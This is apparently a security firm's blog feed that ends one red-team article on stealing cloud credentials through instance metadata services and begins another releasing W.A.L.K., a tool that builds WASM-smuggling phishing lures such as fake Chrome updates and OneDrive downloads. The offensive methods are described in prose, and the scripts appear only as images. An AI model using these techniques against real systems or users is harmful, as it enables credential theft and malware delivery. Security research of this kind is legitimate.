&lt;p&gt;In the above image we can see that the application is being hosted in the ‘demilitarised zone’ or DMZ as would be typical of an on-premise application. This means that the application is effectively firewalled off from the public internet and enterprise (I usually use the term ‘corporate’) networks except for connections that are strictly necessary. Overall, the intention here is to limit the potential impact that could come from compromising said application, crucially preventing it from having unfettered access into the corporate network. This makes sense, as many applications hosted as such are internet-facing and therefore face a considerable risk of compromise. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;In traditional setups, you also have a few common additional layers of security to bypass if you wanted to truly weaponise an application you had compromised. Firstly, you will often be using a dedicated ‘service account’ to run the web server. This account is often only used for running this one web server, and as such has next-to-no permissions to do or access anything else. Finally, you may also find that your exploit (for example a malicious file upload vulnerability) lands in what is called the ‘web root’. This is the directory on the web server in which you store all the contents used for hosting the web server such as config files, images, etc. In these scenarios you may find that the service account you have now compromised cannot even explore the web server’s file system, and instead is strictly limited to the web root. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;When you add all of this up, you may find instances where your super awesome remote code execution vulnerability actually has very limited impact in terms of progressing an attack path towards the internal estate and / or critical assets. This exact scenario happened to me on a purple team engagement last year, in which I exploited a vulnerability to get remote code execution on a web server, only to find that it was firewalled off from the corporate network, restricted to the web root, was not domain-joined, and my account had very little permissions. Ultimately this meant that its ‘usefulness’ to me was limited. In fact, one interesting tidbit about that story is that by listing the contents of the web root by ‘time modified’ I was able to discern that several genuine threat actors had also compromised that web server the same way within the last 5 days or so. Naturally this kicked off an IR engagement, which ultimately discovered that the threat actors, like myself, had found limited impact from the compromise of the web server so had installed crypto miners and called it a day. A full write up of this story was posted last year and can be found &lt;a href=&#34;https://labs.jumpsec.com/butting-heads-with-a-threat-actor-on-an-engagement/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Cloud-Hosted&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;cloud-hosted&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#cloud-hosted&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;So, how do things change when we are discussing a cloud-hosted web application? Well, let me start by saying that achieving the same level of defence in depth is certainly possible with a cloud-hosted web application. However, it is our experience that, just like we see overly permissive IAM roles and abusable default settings in every cloud environment we work in, this is rarely as well locked down when it comes to the far less understood world of cloud. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Additionally, beyond the access control and ‘identities’ belonging to these cloud-hosted applications generally not undergoing the same level of scrutiny as on-premise (partly due to ‘least privilege access’ being a mire in the complex world of cloud permissions) we are also able to leverage a nice feature that all cloud providers have implemented in different ways, called the Metadata Service. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image10.png&#34; title=&#34;image10&#34; alt=&#34;image10&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image10&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;To understand why the metadata service exists I am going to directly quote a great video on the topic from risk3sixty which I urge you to watch &lt;a href=&#34;https://www.youtube.com/watch?v=OaG6wHlhbCQ&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;em&gt;“It is an internal IP address that is attached to any given EC2 instance by default, that provides a set of information that can be used by application developers who need their application to automatically perform some tasks”&lt;/em&gt; - Risk3Sixty&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Here, AWS-specific terminology can be interchangeably used with Azure or GCP terminology, as the same features exist for the same reasons across them all. They even all use the same IP address for this &lt;a href=&#34;http://169.254.169.254&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;http://169.254.169.254&lt;/a&gt;, meaning you do not need to know the specific implementations. As risk3sixty put it, the ‘set of information’ which can be requested here is vast, but can include some very useful information to an attacker. Top of mind is the web application’s session token that it uses to authenticate to the cloud environment and perform actions. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;In order to access this service, we simply need the ability to issue requests as the web application to this specific endpoint. Once we know which endpoint houses the data that is of interest to us we can generate a request and receive back our information. Specifically, we need to coerce the application into sending a HTTP request to the specific metadata endpoint, and read the result. It should go without saying, therefore, that gaining remote code execution on the web server will in almost all cases be sufficient to retrieve that data. However, this could also be leveraged by less ‘impactful’ (in the traditional sense) vulnerabilities such as SSRF. As you might imagine, this could breathe entirely new life into the potential impact of SSRF vulnerabilities.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Cloud vendors realised that these vulnerabilities could potentially open doors to new attack vectors, and so introduced additional controls to protect against them. In all modern metadata services you are required to send additional HTTP headers with specific values, meaning that you are more likely back in the realm of remote code execution. However, in older versions you may find that this is not required, meaning that SSRF could still be sufficient.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;With the theory out of the way let’s look at some practical examples in Azure and AWS. Here are the steps I would take if I landed on an cloud-hosted web servers.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;AWS&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;aws&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#aws&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Firstly, check the version of the metadata service in use. As mentioned, older versions (IMDSv1) do not require additional headers, modern versions (IMDSv2) do.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image2.png&#34; title=&#34;image2&#34; alt=&#34;image2&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image2&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 1:  401 response (missing headers) from main metadata endpoint, meaning IMDSv2 is in use&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-1-401-response-missing-headers-from-main-metadata-endpoint-meaning-imdsv2-is-in-use&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-1-401-response-missing-headers-from-main-metadata-endpoint-meaning-imdsv2-is-in-use&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;As we are working with IMDSv2 we will need to create a bash script or similar which will request the necessary headers, and then include them in subsequent requests which ask for metadata. The script below can be found &lt;a href=&#34;https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#abusing-ssrf-in-aws-ec2-environment&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image1.png&#34; title=&#34;image1&#34; alt=&#34;image1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 2: Bash script for gaining access to IMDSv2 &lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-2-bash-script-for-gaining-access-to-imdsv2&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-2-bash-script-for-gaining-access-to-imdsv2&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Towards the end we can see it requests the ‘credentials’ (think access keys) of the EC2 instance.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image4.png&#34; title=&#34;image4&#34; alt=&#34;image4&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image4&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 3: EC2 Security Credentials requested&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-3-ec2-security-credentials-requested&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-3-ec2-security-credentials-requested&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;We can then run the script and receive back a plethora of useful information, including the keys and tokens the VM uses. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image5.png&#34; title=&#34;image5&#34; alt=&#34;image5&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image5&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 4: Metadata of EC2 instance collected, with EC2 Security Credentials at the bottom.&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-4-metadata-of-ec2-instance-collected-with-ec2-security-credentials-at-the-bottom&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-4-metadata-of-ec2-instance-collected-with-ec2-security-credentials-at-the-bottom&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Azure&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;azure&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#azure&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In Azure, this looks similar. Firstly, we generate a generic request asking for information about the VM with the ‘Metadata:true’ HTTP header. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image3.png&#34; title=&#34;image3&#34; alt=&#34;image3&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image3&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 5: Metadata being returned from Azure Metadata Service endpoint&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-5-metadata-being-returned-from-azure-metadata-service-endpoint&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-5-metadata-being-returned-from-azure-metadata-service-endpoint&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;As the metadata service is returning information correctly we can request our session token of the managed identity assigned to the VM.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image7.png&#34; title=&#34;image7&#34; alt=&#34;image7&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image7&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 6: Session token returned for the VM&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-6-session-token-returned-for-the-vm&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-6-session-token-returned-for-the-vm&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;If you are working with an app ‘service’ as opposed to a VM the process is slightly different but still very much possible. In this case you should follow &lt;a href=&#34;https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#azure-app-service&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;this&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Now, we have these session tokens, so what? You may be thinking that we already had remote code execution on the virtual machine to get to this point so why do we care about the session token? Whilst you may try many of the same attack paths that you could with an on-premise application through this RCE, you now also have another angle of attack. With these session tokens you are able to ‘login’ to the cloud environment (usually without MFA as these are intended to be used by your non-human service accounts). From here, your attack vectors are far more extensive than in most traditional setups. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image9.png&#34; title=&#34;image9&#34; alt=&#34;image9&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image9&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 7: Authenticating to the cloud environment as the compromised Azure VM. &lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-7-authenticating-to-the-cloud-environment-as-the-compromised-azure-vm&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-7-authenticating-to-the-cloud-environment-as-the-compromised-azure-vm&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;For example, having authenticated to the cloud environment you now have an &lt;em&gt;incredibly&lt;/em&gt; rich API at your disposal to begin looking for further vulnerabilities. This could include simply running  ‘&lt;em&gt;Get-AzResource&lt;/em&gt;’ within Azure, which will reveal all resources that you (as the application) have access to. In the screenshot below we can see that in this case this was access to a KeyVault with app secrets within! &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image6.png&#34; title=&#34;image6&#34; alt=&#34;image6&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image6&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 8: The compromised application has access to a KeyVault&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-8-the-compromised-application-has-access-to-a-keyvault&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-8-the-compromised-application-has-access-to-a-keyvault&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Thanks for making that so nice and easy. No searching through config files to find SQL databases and connection strings, then manually crafting individual SQL queries to begin exploitation. Here, we have simply run a single API command and then can run a second to dump all the information that we have. This is just one example of several thousand that you have available to you once you authenticate with common cloud API tooling.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;But wait there&amp;rsquo;s more…now that we have the session token for the application we can begin using any number of enumeration, post-exploitation or privilege escalation tools that we want from the perspective of the application. No need to install tooling on the device and trip off those pesky EDR’s, we can simply fire up our preferred tooling (think Azurehound, GraphRunner, bf-aws-permissions, etc.) and load in your session token. Of course, this introduces different OPSEC concerns, but bypassing those detections is something we will discuss later this year (hopefully at a conf!).&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Cloud Permissions&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;cloud-permissions&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#cloud-permissions&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Now let’s rub salt in the wound. We’ve used our compromise to hit the metadata service and load up our favourite tooling with a session token. Access should be strictly limited, like it was on-premise right? Whilst this is true in theory, understanding and implementing fine-grained access controls and restrictions is a tall order in the modern world of highly complex cloud environments. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;I would like to call out here how many hundreds of IAM roles there are in most cloud environments, many of them with similar yet opposing permissions. Take a &lt;a href=&#34;https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;look&lt;/a&gt; at just the built-in Azure roles (not to mention any custom ones implemented to fill gaps) which already totals more than 130 options. You can see how reading each of these and understanding the nuanced permissions they have can be taxing, and goes some way to explaining why we so regularly see overly permissive accounts. We often see permissions being used without the full knowledge of what subsets of those permissions can introduce. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;To provide a very oversimplified example, we regularly see Global Administrator accounts being very well restricted and kept under lock and key. However, some lesser known roles like ‘Privileged Role Administrator’ and ‘Privileged Authentication Administrator’ both allow a threat actor to escalate privileges to Global Administrator through resetting passwords or assigning roles to attacker-controlled accounts. These permissions may have been assigned more liberally, and compromise of them may not trip off as many alerts. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Ultimately, what I am trying to get at here is that when you combine the complexities of modern cloud environments (which we believe to be largely less well understood than on-prem) with the ability to run a plethora of tooling to identify any misconfigurations or overly permissive accounts (including the application you have compromised!) you often introduce far greater security concerns than you might traditionally do on-premise. Don’t believe me? Read &lt;a href=&#34;https://posts.specterops.io/microsoft-breach-what-happened-what-should-azure-admins-do-da2b7e674ebc&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;this&lt;/a&gt; great deep dive into the Microsoft breach which took place at the start of 2024 in which Microsoft themselves had inadvertently given a legacy app service permissions akin to Global Administrator…&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;The above also introduces an entirely new attack vector within Azure, of applications (service principals) that you compromise potentially having elevated permissions in &lt;em&gt;other&lt;/em&gt; cloud environments beyond just the tenant you are in…but that is a topic for another day.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Serverless Functions&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;serverless-functions&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#serverless-functions&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;A final point is that with the rise of serverless architecture (AWS Lambda, Azure Functions, etc.) we are starting to get our hands on these more often. Crucially, these can still be thought of as cloud-hosted web applications, and may be vulnerable to the same risks mentioned above depending on the implementation. For example, a member of our red team recently found a way to package and exfiltrate data over DNS from an AWS Lambda that had DENY ALL on all TCP and UDP ports to all ranges. For a write up on that check out &lt;a href=&#34;https://labs.jumpsec.com/whats-in-a-name-writing-custom-dns-tunnelling-protocol-on-the-fly-exploiting-unexpected-aws-lambda-misconfiguration-all-in-a-web-app-pen-test-part-1/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;this&lt;/a&gt; recent labs article. The key point here is that whilst they might not look and feel like traditional web apps, these serverless functions present the same risk to an organisation as a web app and can be used to progress attack paths just as well. &lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;conclusion&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#conclusion&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In conclusion, I am not suggesting that up until this point AppSec has not been of paramount importance. However, when looking at the arguments presented and the work we’ve been conducting as a team over the last year I feel that the migration to cloud might present yet another watershed moment in AppSec’s journey. Perhaps it will take a notable organisation to be breached via a cloud-hosted application entry point for this point to become salient, but in my eyes it is a matter of when, not if. Thanks for reading and I hope my internal monologue on the topic was of interest!&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>WASM Smuggling for Initial Access and W.A.L.K. Tool Release</title>
      <link>//localhost:1313/articles/2024/05/2024-05-31-wasm-smuggling-for-initial-access-and-w-a-l-k-tool-release/</link>
      <pubDate>Fri, 31 May 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/05/2024-05-31-wasm-smuggling-for-initial-access-and-w-a-l-k-tool-release/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;figure&gt;
    &lt;img src=&#34;images/8salmg-ezgif.com-crop.gif&#34; title=&#34;8salmg ezgif.com crop&#34; alt=&#34;8salmg ezgif.com crop&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;8salmg ezgif.com crop&lt;/figcaption&gt;
  &lt;/figure&gt;TL;DR&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This blog post introduces Web Assembly (WASM) as a powerful alternative to traditional web technologies, highlighting its appeal to cybersecurity professionals for evading security measures for initial access. WASM has been observed being leveraged in the wild as a new payload delivery avenue which can land payloads in a hardened email inbox or instant messaging chats. A new tool, W.A.L.K. (Web Assembly Lure Krafter), is released alongside this blogpost to automate the generation of payloads using Rust, bringing back HTML smuggling attacks and enhancing red teamers tradecraft.&lt;/p&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;&lt;p&gt;Everyone is aware that the internet is powered by a plethora of platforms, services and technologies, but all the web content we see nowadays were fundamentally built using HTML, CSS and JavaScript. This has been the holy trinity of the web that allowed creative developers to build an amount of sites and content on the internet that cannot possibly be explored in the span of a lifetime, at least not in a non-automated fashion (and I guess I’m including the dark web too there).&lt;/p&gt;
&lt;p&gt;At the same time not everyone is aware that a different way of building web pages has been available to developers and browsers for almost a decade, and this is called Web Assembly.&lt;/p&gt;
&lt;p&gt;Web Assembly (also known as WASM) was released to the public for the first time in 2017. It has allowed internet wizards and obscure developers alike to simulate operating systems or play Doom (&lt;a href=&#34;https://wasm.continuation-labs.com/d3demo/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Doom 3 Demo&lt;/a&gt;) from within browsers (yes, it can play Doom!), opening the world wide web to a new way of building content that was once only reserved for compiled programming languages.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/WASM_Win2000.png&#34; title=&#34;WASM Win2000&#34; alt=&#34;WASM Win2000&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;WASM Win2000&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Windows 2000 rendered in browser using Web Assembly (&lt;a href=&#34;https://bellard.org/jslinux/vm.html?url=https://bellard.org/jslinux/win2k.cfg&amp;amp;mem=192&amp;amp;graphic=1&amp;amp;w=1024&amp;amp;h=768&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;view&lt;/a&gt;). More projects can be found on &lt;a href=&#34;https://madewithwebassembly.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;madewithwebassembly&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;What is WASM?&lt;/h1&gt;&lt;p&gt;WASM’s origins can be traced back to asm.js, a subset of JavaScript designed to facilitate the deployment of C and other demanding applications within web browsers. Recognising its potential, it was W3C that spearheaded it&amp;rsquo;s evolution into the open standard now known as Web Assembly. Web Assembly’s strengths lay in its core promise of speed and performance, far outpacing traditional JavaScript. It allows browsers to perform intensive computations with efficiency and stability, avoiding many of the pitfalls of JavaScript&amp;rsquo;s limitations.&lt;/p&gt;
&lt;p&gt;It operates in two primary formats: a compact binary format for the browser&amp;rsquo;s Virtual Machine (VM) and an assembly-like textual format. While earlier technologies like Adobe’s Flash struggled with this, Web Assembly stands out, although it still remains under scrutiny for &lt;a href=&#34;https://www.youtube.com/watch?v=QWsSNRQN7v8&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;potential vulnerabilities&lt;/a&gt;. Importantly though, Web Assembly supports the seamless execution of code from multiple languages such as C, C++, Rust, and Go.&lt;/p&gt;
&lt;h1&gt;Why is WASM interesting to cybersecurity folks?&lt;/h1&gt;&lt;p&gt;You probably guessed it by now! As it is a lesser known alternative to build web content, it is also more interesting for threat actors that want to circumvent classic email filters and their security controls.&lt;/p&gt;
&lt;p&gt;From the red teaming perspective WASM presents features that can introduce malicious capabilities such as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Run malicious content within browsers.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Evade traditional known-malicious JavaScript functions, like window.local.href (a property in JavaScript that gets or sets the URL of the current window, usually used to redirect the browser to a different URL) and window.navigator.msSaveOrOpenElob (typically used to download files from a web application, it allows for the saving or opening of a blob).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Bypass detection mechanisms typical of conventional file type signatures.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Consider all of the mechanisms that browsers, web service providers, operating systems and security companies have developed and implemented over the years to identify, detect and alert against suspicious web pages that try to execute malicious code. Such defences have been mostly adapted to the malicious JavaScript and HTML tags that can be contained in a web page. So, what happens when instead we use Web Assembly to build a web page? We observe security controls becoming nearly non-existent when attempting to determine whether the web page is nefarious or legitimate.&lt;/p&gt;
&lt;p&gt;Combine WASM with techniques such as payload smuggling and you get a modern and stealthy initial access tactic that gets past modern email and instant messaging defences allowing your initial access to land in your target’s inbox unhindered!&lt;/p&gt;
&lt;p&gt;When I read about this I was way too excited not to dive into this evolved way of smuggling payloads and therefore, if you haven’t before, I’m honoured to introduce you to WASM smuggling and the tool I have built to automate payload generation.&lt;/p&gt;
&lt;h1&gt;Smuggling Payloads using W.A.L.K.&lt;/h1&gt;&lt;p&gt;I was never a proficient developer (even more so for languages such as C or Rust) so I asked for some help from my favourite AI companion to better understand the concepts behind WASM smuggling. I started from this amazing article from &lt;a href=&#34;https://blog.delivr.to/webassembly-smuggling-it-wasmt-me-648a62547ff4&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;deliver.to&lt;/a&gt; and managed to create a few web lures leveraging Rust, which inevitably led me to wanting to build a tool to automate the process. The above deliver.to’s article describes how attackers have been using Rust to recreate classic HTML smuggling techniques that get past the craziest email controls. Bonus - it also gives some nice templates coded in Rust!&lt;/p&gt;
&lt;p&gt;On top of this, a &lt;a href=&#34;https://www.crowdstrike.com/blog/ecriminals-increasingly-use-webassembly-to-hide-malware/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CrowdStrike article&lt;/a&gt; also described how threat actors have been using this technique for a few years now (the article is from 2021) and together with NetSPI’s blog post on &lt;a href=&#34;https://www.netspi.com/blog/technical-blog/adversary-simulation/obfuscating-html-smuggling-with-web-assembly/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;SilkWASM&lt;/a&gt; I felt like I had enough examples to start building towards executing this tactic and going through the process needed to generate lures to be weaponised for initial access.&lt;/p&gt;
&lt;p&gt;At this point, we know that this technique is actively being used by malicious actors, it can circumvent traditional mail security controls and can be combined with obsolete and disused HTML smuggling techniques to perform older attacks in a modern fashion. Although bringing back Beef hooks may sound exciting, these were not very effective against modern browser sandboxing features. Yet attacks such as &lt;a href=&#34;https://blog.delivr.to/html-smuggling-recent-observations-of-threat-actor-techniques-74501d5c8a06&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;SVG Smuggling&lt;/a&gt; could be fruitful when built using WASM.&lt;/p&gt;
&lt;p&gt;The process of creating a standalone WASM smuggling lure is somewhat tortuous if you are not a proficient Rust developer and I will purposefully skip the part where I tell you how to manually set one up. There is enough information on the internet to understand and guide you through this process. Nonetheless, allow me to introduce you to my new tool W.A.L.K. (Web Assembly Lure Krafter) which I developed to ease the above-mentioned process of building a standalone WASM payload smuggling lure.&lt;/p&gt;
&lt;p&gt;The lure generated by the tool is based on prebuilt lure templates coded in Rust. It embeds payloads to smuggle through in a single HTML file which can then be sent in either instant messaging chats or via email attachments.&lt;/p&gt;
&lt;p&gt;W.A.L.K. can be found at the following Github repository:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/JumpsecLabs/WALK_WebAssembly_Lure_Krafter&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/JumpsecLabs/WALK_WebAssembly_Lure_Krafter&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Follow through the repo’s README to set up your Rust environment and the relevant WASM libraries. Once done, navigate to the project’s root folder and simply run the tool from the command line using cargo run.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/WALK_menu.png&#34; title=&#34;WALK menu&#34; alt=&#34;WALK menu&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;WALK menu&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;This will start W.A.L.K., presenting a menu with 3 lure templates to select from. The selection will be used to generate a template that embeds a custom payload and delivers it differently based on the lure selected.&lt;/p&gt;
&lt;p&gt;The “Google Chrome Update” lure was designed to simulate a Google Chrome binary download motivated by a pretext such as “I.T. wants you to upgrade your version of Chrome”. The download button will trigger the download of the payload you embedded during the generation through W.A.L.K.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/NoPlaceLikeChrome.png&#34; title=&#34;NoPlaceLikeChrome&#34; alt=&#34;NoPlaceLikeChrome&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;NoPlaceLikeChrome&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The “One Drive File Download” template instead uses a lure based on the looks of Microsoft OneDrive. The lure generated off this template will trigger a file download 4 seconds after rendering the web page, simulating the delivery of files via a shareable OneDrive link.&lt;/p&gt;
&lt;p&gt;As an example, this can be used with the pretext of wanting to provide HR (or a recruiter) with your resume and perhaps smuggle a payload through with it.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
